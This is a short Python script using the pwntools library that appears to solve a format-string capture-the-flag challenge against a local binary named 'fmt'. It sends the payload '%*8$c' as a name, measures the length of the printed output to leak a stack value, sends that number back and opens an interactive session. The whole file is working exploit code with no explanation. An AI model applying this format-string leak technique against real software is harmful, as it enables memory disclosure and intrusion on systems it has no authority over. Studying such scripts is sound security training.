#!/usr/bin/python3

from pwn import *

exe = ELF('./fmt')

p= process(exe.path)
# p= gdb.debug(exe.path,'''
#              b* vuln+278
#              b* vuln+291 
#              c
#              c
#              ''')

p.sendlineafter("Enter your name: ",b'%*8$c')
p.recvuntil("Your name is: ")
rec = p.recvuntil("Enter your ",drop = True)
log.info("number: " + hex(len(rec)-2))
p.sendlineafter("number: ",str(len(rec)-2))

p.interactive()


#%*8$c